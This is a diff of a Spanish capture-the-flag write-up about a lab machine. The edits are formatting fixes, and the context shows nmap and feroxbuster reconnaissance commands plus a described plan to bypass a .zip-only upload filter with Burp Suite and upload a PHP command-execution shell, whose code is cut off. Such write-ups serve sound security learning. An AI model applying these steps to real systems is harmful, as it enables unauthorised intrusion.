@@ -4,7 +4,7 @@ Comienzo haciendo nmap, veo solo un apache no vulnerable en el 80.
 
 ```
 sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
-[Anonymouspingu](Anonymouspingu.md)```
+```
 
 Hago fuzzing y encuentro varias páginas: 
 
@@ -16,7 +16,7 @@ feroxbuster -u http://172.17.0.2 -x php -x html -x txt -x js -x py -w /usr/share
 En http://172.17.0.2/machine.php encuentro que puedo subir archivos. Por tanto, intentaré un #LFI (Local File Inclusion). Pruebo con un txt y veo que solo me deja subir .zips. Interceptaré la petición con burpsuite para engañarle y subir algún archivo .php. Por lo que he visto en otros writeups, esto se llama `Arbitrary File Upload`
 
 
-```
+```php
 # Creo un php con el que podré ejecutar comandos remotas: 
 <html>
 <body>
